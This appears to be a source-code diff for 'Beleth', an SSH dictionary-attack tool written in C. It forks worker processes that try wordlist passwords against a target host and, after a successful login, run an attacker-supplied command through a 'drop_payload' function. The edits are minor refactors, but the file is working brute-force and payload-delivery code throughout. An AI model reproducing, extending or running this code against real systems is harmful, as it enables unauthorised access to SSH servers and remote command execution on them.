@@ -1,21 +1,16 @@
 /*
  * Beleth - SSH Dictionary Attack
+ * beleth.c -- Main functions
  */ 
 
 #include <libssh2.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
 #include <unistd.h>
-#include <arpa/inet.h>
-#include <sys/types.h>
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <ctype.h>
 #include <sys/un.h>
-#include <time.h>
 #include <sys/wait.h>
-#include <errno.h>
 
 #include "beleth.h"
 #include "lists.h"
@@ -42,6 +37,7 @@ int read_wordlist(char *path) {
 	
 	while (fgets(line,sizeof(line)-1, wordlist) != NULL) {
 			++cnt;
+			line[strlen(line)-1] = '\0'; /* Trim of new line */
 			add_pw_list(line);
 	}
 	
@@ -99,7 +95,6 @@ void crack_thread(struct t_ctx *c_thread) {
 			session_cleanup(c_thread->sock, c_thread->session);
 			exit(0);
 		} 
-		buf[strlen(buf)-1] = '\0'; /* Trim of new line */
 		
 		if (verbose >= VERBOSE_ATTEMPTS)
 			fprintf(stderr,"[+] (%d) Trying %s %s\n",getpid(),username,buf);
@@ -118,6 +113,7 @@ void crack_thread(struct t_ctx *c_thread) {
 			}
 		} else {
 			printf("[*] Authentication succeeded (%s:%s@%s:%d)\n",username, buf, c_thread->host, c_thread->port);
+			printf("[*] Executing: %s\n",cmdline);
 			if (drop_payload(c_thread->sock,c_thread->session,(char *)cmdline) == -1) {
 				if (verbose >= VERBOSE_DEBUG)
 					fprintf(stderr, "Error executing command.\n");
@@ -326,7 +322,9 @@ int main(int argc, char *argv[]) {
 		exit(1);
 	}
 	
-	printf("\e[32m\e[40m+-----------------------------------------+\e[0m\n\e[40m\e[32m|                 Beleth                  |\e[0m\n\e[40m\e[32m|           www.chokepoint.net            |\e[0m\n\e[40m\e[32m+-----------------------------------------+\e[0m\n");
+	/* Print banner */
+	printf("\e[32m\e[40m+-----------------------------------------+\e[0m\n\e[40m\e[32m|                 Beleth                  |\e[0m\n");
+	printf("\e[40m\e[32m|           www.chokepoint.net            |\e[0m\n\e[40m\e[32m+-----------------------------------------+\e[0m\n");
 	
 	/* Initiate the linked list using the given wordlist */
     if (read_wordlist(str_wordlist) == -1)
@@ -365,9 +363,11 @@ int main(int argc, char *argv[]) {
 		} else if (pid == 0)  { 				/* child thread */
 			crack_thread(t_current);
 			
-			free(ptr);
+			if (ptr != NULL)
+				free(ptr);
 		} else {
-			free(ptr);
+			if (ptr != NULL)
+				free(ptr);
 		}
 	}
  
